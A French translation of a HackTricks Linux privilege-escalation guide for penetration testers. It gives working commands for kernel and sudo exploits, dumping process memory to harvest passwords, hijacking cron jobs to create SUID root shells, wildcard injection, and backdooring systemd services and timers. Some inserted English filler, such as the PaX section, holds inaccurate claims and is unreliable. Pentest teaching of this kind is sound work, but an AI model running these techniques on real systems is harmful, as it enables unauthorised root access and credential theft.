# Élévation de privilèges Linux

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? Ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informations système

### Informations sur le système d'exploitation

Commençons par acquérir des connaissances sur le système d'exploitation en cours d'exécution.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Chemin

Si vous **avez des permissions d'écriture sur n'importe quel dossier à l'intérieur de la variable `PATH`**, vous pourriez être en mesure de détourner certaines bibliothèques ou binaires :
```bash
echo $PATH
```
### Informations sur l'environnement

Des informations intéressantes, des mots de passe ou des clés API dans les variables d'environnement ?
```bash
(env || set) 2>/dev/null
```
### Exploits du noyau

Vérifiez la version du noyau et s'il existe une faille qui peut être utilisée pour escalader les privilèges.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Vous pouvez trouver une bonne liste de noyaux vulnérables et certains **exploits déjà compilés** ici : [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) et [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits).\
D'autres sites où vous pouvez trouver des **exploits compilés** : [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Pour extraire toutes les versions de noyaux vulnérables à partir de ce site web, vous pouvez exécuter la commande suivante :
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Les outils qui pourraient aider à rechercher des exploits du noyau sont :

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (exécuter sur la victime, vérifie uniquement les exploits pour le noyau 2.x)

Toujours **rechercher la version du noyau sur Google**, peut-être que votre version du noyau est mentionnée dans un exploit du noyau, et vous serez alors sûr que cet exploit est valide.

### CVE-2016-5195 (DirtyCow)

Élévation de privilèges Linux - Noyau Linux <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Version de Sudo

Basé sur les versions vulnérables de sudo qui apparaissent dans :
```bash
searchsploit sudo
```
Vous pouvez vérifier si la version de sudo est vulnérable en utilisant cette commande grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### sudo < v1.28

De @sickrov
```
sudo -u#-1 /bin/bash
```
### Échec de la vérification de la signature Dmesg

Vérifiez la **boîte smasher2 de HTB** pour un **exemple** de la façon dont cette vulnérabilité pourrait être exploitée.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Plus d'énumération du système

In addition to the basic system enumeration techniques mentioned earlier, there are several other methods that can be used to gather information about a target system. These techniques can help in identifying potential vulnerabilities and privilege escalation opportunities.

#### 1. Process Enumeration

Process enumeration involves listing all running processes on the system. This can be done using commands like `ps` or `top`. By examining the list of processes, you can identify any suspicious or unauthorized processes that may be running.

#### 2. Service Enumeration

Service enumeration involves identifying the services running on the system. This can be done using commands like `netstat` or `ss`. By analyzing the list of services, you can determine if any unnecessary or vulnerable services are running.

#### 3. File and Directory Enumeration

File and directory enumeration involves listing the files and directories on the system. This can be done using commands like `ls` or `find`. By examining the file system, you can identify any sensitive files or directories that may be accessible.

#### 4. Network Enumeration

Network enumeration involves gathering information about the network configuration of the system. This can be done using commands like `ifconfig` or `ip`. By analyzing the network settings, you can identify any open ports or network services that may be exploitable.

#### 5. User Enumeration

User enumeration involves identifying the users and groups on the system. This can be done using commands like `id` or `cat /etc/passwd`. By examining the user accounts, you can identify any privileged or misconfigured accounts that may be targeted for privilege escalation.

#### 6. Kernel Enumeration

Kernel enumeration involves gathering information about the kernel version and configuration. This can be done using commands like `uname` or `cat /proc/version`. By analyzing the kernel information, you can identify any known vulnerabilities or weaknesses that may be exploited.

#### 7. Software Enumeration

Software enumeration involves identifying the installed software and its versions on the system. This can be done using commands like `dpkg` or `rpm`. By examining the software versions, you can determine if any known vulnerabilities exist that can be exploited.

By performing these additional system enumeration techniques, you can gather more information about the target system and increase your chances of finding vulnerabilities and privilege escalation opportunities.
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
AppArmor is a Linux security module that restricts the capabilities of individual applications. It works by defining a set of rules that determine what resources an application can access. These rules are based on the application's profile, which specifies the allowed actions and file paths.

To enumerate possible defenses related to AppArmor, you can perform the following steps:

1. Check if AppArmor is installed and enabled on the target system:
   ```
   sudo apparmor_status
   ```

2. Identify the AppArmor profiles that are active:
   ```
   sudo aa-status
   ```

3. Review the profiles to understand the restrictions imposed on each application. This will help you identify potential limitations that could prevent privilege escalation.

4. Look for misconfigurations or vulnerabilities in the AppArmor profiles that could be exploited. Common misconfigurations include overly permissive rules or incorrect file path specifications.

5. If you find a misconfiguration, attempt to exploit it by crafting an attack that violates the restrictions imposed by the AppArmor profile. This could involve attempting to access restricted files or executing forbidden commands.

By enumerating possible defenses related to AppArmor, you can identify weaknesses that may allow for privilege escalation on a target system.
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity

Grsecurity est un ensemble de correctifs de sécurité pour le noyau Linux qui vise à renforcer la sécurité du système d'exploitation. Il fournit des fonctionnalités avancées de protection contre les attaques de type débordement de tampon, les attaques par déni de service et les attaques de dépassement de capacité. Grsecurity offre également des mécanismes de contrôle d'accès stricts pour limiter les privilèges des utilisateurs et des processus.

L'un des principaux avantages de Grsecurity est sa capacité à prévenir l'escalade de privilèges. Il utilise des techniques telles que la randomisation de l'espace d'adressage, la séparation des privilèges et la limitation des capacités pour réduire les risques d'exploitation des vulnérabilités du noyau.

Grsecurity est souvent utilisé dans les environnements où la sécurité est une priorité, tels que les serveurs d'hébergement, les systèmes de gestion de bases de données et les infrastructures cloud. Il est compatible avec de nombreuses distributions Linux, notamment Debian, Ubuntu et CentOS.

Pour installer Grsecurity, vous devez d'abord télécharger les correctifs correspondants à votre version du noyau Linux. Ensuite, vous devez appliquer les correctifs et recompiler le noyau. Une fois que Grsecurity est installé, vous pouvez configurer ses fonctionnalités de sécurité en utilisant les options de configuration du noyau.

Il est important de noter que l'installation de Grsecurity peut nécessiter des connaissances avancées en administration système et en compilation du noyau. Il est recommandé de suivre attentivement les instructions fournies par les développeurs de Grsecurity et de tester soigneusement le système après l'installation pour s'assurer qu'il fonctionne correctement.
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
PaX is a patch for the Linux kernel that provides various security features, including protection against privilege escalation attacks. It works by implementing various memory protection mechanisms, such as Address Space Layout Randomization (ASLR) and Executable Space Protection (ESP). These features make it more difficult for attackers to exploit vulnerabilities and gain elevated privileges on a system.

To enable PaX on a Linux system, you need to have a kernel that supports it. Once you have the appropriate kernel, you can enable PaX by adding the `pax=1` parameter to the kernel command line in the bootloader configuration. This will activate PaX and enforce its security features.

PaX provides several protection modes, including "paxctl" and "paxtest". The "paxctl" utility allows you to set specific security attributes for individual executables, such as disabling executable stack or marking an executable as non-executable. The "paxtest" utility, on the other hand, is used to test the effectiveness of PaX's security features on a system.

Overall, PaX is a powerful tool for hardening a Linux system against privilege escalation attacks. By implementing various memory protection mechanisms, it adds an extra layer of security to the operating system.
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield

Execshield est une fonctionnalité de sécurité pour les systèmes d'exploitation Linux qui vise à prévenir les attaques de dépassement de tampon en protégeant la mémoire exécutable. Il utilise des techniques telles que l'allocation aléatoire de l'espace mémoire, la désactivation de l'exécution de données et la protection contre les attaques de retour sur la pile. Ces mesures de sécurité renforcent la résistance du système contre les tentatives d'escalade de privilèges et les attaques par exécution de code malveillant.
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux

SElinux (Security-Enhanced Linux) est un mécanisme de sécurité pour les systèmes d'exploitation Linux qui permet de renforcer les politiques de contrôle d'accès. Il fournit une couche supplémentaire de sécurité en utilisant des règles de sécurité basées sur les étiquettes pour restreindre les actions des utilisateurs et des processus.

L'objectif principal de SElinux est de limiter les privilèges des utilisateurs et des processus, afin de réduire les risques de compromission du système. Il permet de définir des politiques de sécurité granulaires pour chaque processus et fichier du système, en spécifiant les actions autorisées et les restrictions.

SElinux utilise des étiquettes pour identifier les objets du système, tels que les fichiers, les processus et les ports réseau. Chaque objet se voit attribuer une étiquette de sécurité qui détermine les actions autorisées. Les politiques de sécurité SElinux sont définies dans des fichiers de configuration, qui spécifient les règles de contrôle d'accès pour chaque étiquette.

En utilisant SElinux, les administrateurs système peuvent renforcer la sécurité de leurs systèmes Linux en limitant les privilèges des utilisateurs et des processus. Cela réduit les risques de compromission du système et aide à prévenir les attaques de privilège d'escalade.

Pour activer SElinux, vous pouvez modifier le fichier de configuration `/etc/selinux/config` et définir la variable `SELINUX` sur `enforcing`. Une fois activé, SElinux appliquera les politiques de sécurité définies pour restreindre les actions des utilisateurs et des processus.

Il est important de noter que l'utilisation de SElinux peut nécessiter une certaine configuration et une compréhension approfondie de ses fonctionnalités. Il est recommandé de consulter la documentation officielle de SElinux pour en savoir plus sur son utilisation et sa configuration.
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR

Address Space Layout Randomization (ASLR) est une technique de sécurité utilisée pour prévenir les attaques par débordement de tampon et les attaques de dépassement de pile. L'ASLR fonctionne en randomisant la disposition des bibliothèques, des segments de code et des zones de mémoire dans l'espace d'adressage d'un processus. Cela rend plus difficile pour un attaquant de prédire où se trouvent les vulnérabilités dans la mémoire et d'exploiter ces vulnérabilités pour exécuter du code malveillant.

L'ASLR est activé par défaut sur de nombreux systèmes d'exploitation, y compris Linux. Cependant, il peut être désactivé ou configuré de manière incorrecte, ce qui peut rendre un système vulnérable aux attaques de privilège d'escalade. Il est donc important de vérifier et de configurer correctement l'ASLR sur un système Linux pour renforcer la sécurité.

Pour vérifier si l'ASLR est activé sur un système Linux, vous pouvez exécuter la commande suivante :

```bash
sysctl kernel.randomize_va_space
```

Si la valeur retournée est `2`, cela signifie que l'ASLR est activé. Si la valeur retournée est `0`, cela signifie que l'ASLR est désactivé. Pour activer l'ASLR, vous pouvez exécuter la commande suivante :

```bash
sudo sysctl -w kernel.randomize_va_space=2
```

Il est également recommandé de configurer l'ASLR pour qu'il soit activé au démarrage du système. Pour ce faire, vous pouvez ajouter la ligne suivante au fichier `/etc/sysctl.conf` :

```bash
kernel.randomize_va_space=2
```

Après avoir configuré l'ASLR, redémarrez le système pour que les modifications prennent effet.

L'activation et la configuration correcte de l'ASLR sur un système Linux peuvent contribuer à renforcer la sécurité en rendant plus difficile l'exploitation des vulnérabilités de mémoire.
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Évasion de Docker

Si vous êtes à l'intérieur d'un conteneur Docker, vous pouvez essayer de vous échapper :

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Lecteurs

Vérifiez **ce qui est monté et démonté**, où et pourquoi. Si quelque chose est démonté, vous pouvez essayer de le monter et vérifier les informations privées.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Logiciels utiles

Énumérez les binaires utiles
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Vérifiez également si **un compilateur est installé**. Cela est utile si vous avez besoin d'utiliser une exploitation du noyau, car il est recommandé de la compiler sur la machine où vous allez l'utiliser (ou sur une machine similaire).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Logiciels Vulnérables Installés

Vérifiez la **version des packages et services installés**. Il se peut qu'il y ait une ancienne version de Nagios (par exemple) qui pourrait être exploitée pour une élévation de privilèges...\
Il est recommandé de vérifier manuellement la version des logiciels installés les plus suspects.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Si vous avez accès SSH à la machine, vous pouvez également utiliser **openVAS** pour vérifier si des logiciels obsolètes et vulnérables sont installés à l'intérieur de la machine.

{% hint style="info" %}
_Notez que ces commandes afficheront beaucoup d'informations qui seront principalement inutiles. Il est donc recommandé d'utiliser des applications telles que OpenVAS ou similaires qui vérifieront si une version de logiciel installée est vulnérable à des exploits connus._
{% endhint %}

## Processus

Jetez un coup d'œil aux **processus en cours d'exécution** et vérifiez si un processus a **plus de privilèges qu'il ne devrait en avoir** (peut-être un tomcat exécuté par root ?)
```bash
ps aux
ps -ef
top -n 1
```
Vérifiez toujours s'il y a des [**débogueurs electron/cef/chromium** en cours d'exécution, vous pourriez les exploiter pour escalader les privilèges](electron-cef-chromium-debugger-abuse.md). **Linpeas** les détecte en vérifiant le paramètre `--inspect` dans la ligne de commande du processus.\
Vérifiez également vos privilèges sur les binaires des processus, peut-être pouvez-vous les écraser.

### Surveillance des processus

Vous pouvez utiliser des outils comme [**pspy**](https://github.com/DominicBreuker/pspy) pour surveiller les processus. Cela peut être très utile pour identifier les processus vulnérables qui sont exécutés fréquemment ou lorsque certaines conditions sont remplies.

### Mémoire des processus

Certains services d'un serveur enregistrent les **identifiants en clair dans la mémoire**.\
Normalement, vous aurez besoin de **privilèges root** pour lire la mémoire des processus appartenant à d'autres utilisateurs, donc cela est généralement plus utile lorsque vous êtes déjà root et que vous voulez découvrir plus d'identifiants.\
Cependant, rappelez-vous que **en tant qu'utilisateur régulier, vous pouvez lire la mémoire des processus que vous possédez**.

{% hint style="warning" %}
Notez qu'aujourd'hui, la plupart des machines **n'autorisent pas ptrace par défaut**, ce qui signifie que vous ne pouvez pas extraire les processus appartenant à votre utilisateur non privilégié.

Le fichier _**/proc/sys/kernel/yama/ptrace\_scope**_ contrôle l'accessibilité de ptrace :

* **kernel.yama.ptrace\_scope = 0** : tous les processus peuvent être débogués, tant qu'ils ont le même uid. C'est la façon classique dont ptrace fonctionnait.
* **kernel.yama.ptrace\_scope = 1** : seul un processus parent peut être débogué.
* **kernel.yama.ptrace\_scope = 2** : Seuls les administrateurs peuvent utiliser ptrace, car cela nécessite la capacité CAP\_SYS\_PTRACE.
* **kernel.yama.ptrace\_scope = 3** : Aucun processus ne peut être tracé avec ptrace. Une fois défini, un redémarrage est nécessaire pour réactiver le traçage.
{% endhint %}

#### GDB

Si vous avez accès à la mémoire d'un service FTP (par exemple), vous pouvez obtenir le tas (Heap) et rechercher à l'intérieur les identifiants.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### Script GDB

{% code title="dump-memory.sh" %}
```bash
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
{% endcode %}

#### /proc/$pid/maps & /proc/$pid/mem

Pour un ID de processus donné, **maps montre comment la mémoire est mappée dans l'espace d'adressage virtuel de ce processus**; il montre également les **permissions de chaque région mappée**. Le fichier pseudo **mem expose la mémoire du processus lui-même**. À partir du fichier **maps**, nous savons quelles **régions de mémoire sont lisibles** et leurs décalages. Nous utilisons ces informations pour **rechercher dans le fichier mem et extraire toutes les régions lisibles** dans un fichier.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` permet d'accéder à la mémoire **physique** du système, et non à la mémoire virtuelle. L'espace d'adressage virtuel du noyau peut être accédé en utilisant /dev/kmem.\
Généralement, `/dev/mem` n'est lisible que par l'utilisateur **root** et le groupe **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump pour Linux

ProcDump est une réinterprétation de l'outil classique ProcDump de la suite d'outils Sysinternals pour Windows, adapté pour Linux. Vous pouvez le trouver sur [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Outils

Pour extraire la mémoire d'un processus, vous pouvez utiliser :

* [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
* [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Vous pouvez supprimer manuellement les exigences de root et extraire le processus détenu par vous
* Script A.5 de [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root est requis)

### Identifiants extraits de la mémoire du processus

#### Exemple manuel

Si vous constatez que le processus d'authentification est en cours d'exécution :
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Vous pouvez extraire le processus (voir les sections précédentes pour trouver différentes méthodes d'extraction de la mémoire d'un processus) et rechercher des informations d'identification à l'intérieur de la mémoire :
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

L'outil [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) va **voler les identifiants en clair de la mémoire** et de certains **fichiers bien connus**. Il nécessite des privilèges root pour fonctionner correctement.

| Fonctionnalité                                    | Nom du processus      |
| ------------------------------------------------- | -------------------- |
| Mot de passe GDM (Kali Desktop, Debian Desktop)   | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Connexions FTP actives)                   | vsftpd               |
| Apache2 (Sessions HTTP Basic Auth actives)        | apache2              |
| OpenSSH (Sessions SSH actives - Utilisation de Sudo) | sshd:                |

#### Rechercher des expressions régulières/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Tâches planifiées/Cron

Vérifiez si une tâche planifiée est vulnérable. Peut-être pouvez-vous profiter d'un script exécuté par root (vulnérabilité de caractère générique ? pouvez-vous modifier les fichiers utilisés par root ? utiliser des liens symboliques ? créer des fichiers spécifiques dans le répertoire utilisé par root ?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Chemin de Cron

Par exemple, à l'intérieur de _/etc/crontab_, vous pouvez trouver le CHEMIN : _CHEMIN=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Remarquez comment l'utilisateur "user" a des privilèges d'écriture sur /home/user_)

Si à l'intérieur de ce crontab, l'utilisateur root essaie d'exécuter une commande ou un script sans définir le chemin. Par exemple : _\* \* \* \* root overwrite.sh_\
Alors, vous pouvez obtenir un shell root en utilisant :
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron utilisant un script avec un joker (Injection de joker)

Si un script est exécuté par root et contient un "**\***" à l'intérieur d'une commande, vous pouvez exploiter cela pour faire des choses inattendues (comme une élévation de privilèges). Exemple :
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Si le joker est précédé d'un chemin comme** _**/some/path/\***_ **, il n'est pas vulnérable (même** _**./\***_ **ne l'est pas).**

Consultez la page suivante pour plus de techniques d'exploitation des jokers :

{% content-ref url="wildcards-spare-tricks.md" %}
[wildcards-spare-tricks.md](wildcards-spare-tricks.md)
{% endcontent-ref %}

### Écrasement de script Cron et lien symbolique

Si vous **pouvez modifier un script Cron** exécuté par root, vous pouvez obtenir un shell très facilement :
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Si le script exécuté par root utilise un **répertoire où vous avez un accès complet**, il pourrait être utile de supprimer ce dossier et de **créer un lien symbolique vers un autre** qui exécute un script contrôlé par vous.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Tâches cron fréquentes

Vous pouvez surveiller les processus pour rechercher ceux qui sont exécutés toutes les 1, 2 ou 5 minutes. Peut-être pouvez-vous en profiter pour escalader les privilèges.

Par exemple, pour **surveiller toutes les 0,1s pendant 1 minute**, **trier par les commandes les moins exécutées** et supprimer les commandes qui ont été le plus exécutées, vous pouvez faire :
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Vous pouvez également utiliser** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (cela permettra de surveiller et répertorier chaque processus qui démarre).

### Tâches cron invisibles

Il est possible de créer une tâche cron **en ajoutant un retour chariot après un commentaire** (sans caractère de nouvelle ligne), et la tâche cron fonctionnera. Exemple (notez le caractère de retour chariot) :
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Services

### Fichiers _.service_ modifiables

Vérifiez si vous pouvez écrire un fichier `.service`. Si vous le pouvez, vous **pouvez le modifier** pour qu'il **exécute** votre **porte dérobée lorsque** le service est **démarré**, **redémarré** ou **arrêté** (vous devrez peut-être attendre que la machine soit redémarrée).\
Par exemple, créez votre porte dérobée à l'intérieur du fichier .service avec **`ExecStart=/tmp/script.sh`**

### Binaires de service modifiables

Gardez à l'esprit que si vous avez **des permissions d'écriture sur les binaires exécutés par les services**, vous pouvez les modifier pour y ajouter des portes dérobées afin qu'elles soient exécutées lorsque les services sont réexécutés.

### Chemin systemd - Chemins relatifs

Vous pouvez voir le CHEMIN utilisé par **systemd** avec:
```bash
systemctl show-environment
```
Si vous constatez que vous pouvez **écrire** dans l'un des dossiers du chemin, vous pourriez être en mesure de **escalader les privilèges**. Vous devez rechercher des fichiers de configuration de service utilisant des **chemins relatifs**, tels que :
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Ensuite, créez un **exécutable** avec le **même nom que le chemin relatif binaire** à l'intérieur du dossier PATH de systemd où vous pouvez écrire, et lorsque le service est invité à exécuter l'action vulnérable (**Démarrer**, **Arrêter**, **Recharger**), votre **porte dérobée sera exécutée** (les utilisateurs non privilégiés ne peuvent généralement pas démarrer/arrêter les services, mais vérifiez si vous pouvez utiliser `sudo -l`).

**En savoir plus sur les services avec `man systemd.service`.**

## **Minuteries**

Les **minuteries** sont des fichiers d'unité systemd dont le nom se termine par `**.timer**` qui contrôlent les fichiers ou événements `**.service**`. Les **minuteries** peuvent être utilisées comme une alternative à cron car elles prennent en charge les événements de temps calendrier et les événements de temps monotone et peuvent être exécutées de manière asynchrone.

Vous pouvez énumérer toutes les minuteries avec :
```bash
systemctl list-timers --all
```
### Timers modifiables

Si vous pouvez modifier un timer, vous pouvez le faire exécuter des existants de systemd.unit (comme un `.service` ou un `.target`)
```bash
Unit=backdoor.service
```
Dans la documentation, vous pouvez lire ce qu'est une unité :

> L'unité à activer lorsque ce minuteur s'écoule. L'argument est un nom d'unité, dont le suffixe n'est pas ".timer". Si ce paramètre n'est pas spécifié, il est par défaut une unité de service qui a le même nom que l'unité du minuteur, à l'exception du suffixe. (Voir ci-dessus.) Il est recommandé que le nom de l'unité activée et le nom de l'unité du minuteur soient identiques, à l'exception du suffixe.

Par conséquent, pour abuser de cette autorisation, vous auriez besoin de :

* Trouver une unité systemd (comme un fichier `.service`) qui **exécute un binaire en écriture**
* Trouver une unité systemd qui **exécute un chemin relatif** et avoir des **privilèges d'écriture** sur le **chemin systemd** (pour se faire passer pour cet exécutable)

**En savoir plus sur les minuteurs avec `man systemd.timer`.**

### **Activation du minuteur**

Pour activer un minuteur, vous avez besoin de privilèges root et d'exécuter :
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Notez que le **timer** est **activé** en créant un lien symbolique vers celui-ci sur `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

En bref, un Unix Socket (techniquement, le nom correct est Unix Domain Socket, **UDS**) permet la **communication entre deux processus différents** sur la même machine ou sur des machines différentes dans des frameworks d'application client-serveur. Pour être plus précis, c'est un moyen de communiquer entre des ordinateurs en utilisant un fichier de descripteurs Unix standard. (À partir de [ici](https://www.linux.com/news/what-socket/)).

Les sockets peuvent être configurés à l'aide de fichiers `.socket`.

**En savoir plus sur les sockets avec `man systemd.socket`.** À l'intérieur de ce fichier, plusieurs paramètres intéressants peuvent être configurés :

* `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction` : Ces options sont différentes mais un résumé est utilisé pour **indiquer où il va écouter** le socket (le chemin du fichier de socket AF\_UNIX, l'adresse IPv4/6 et/ou le numéro de port à écouter, etc.)
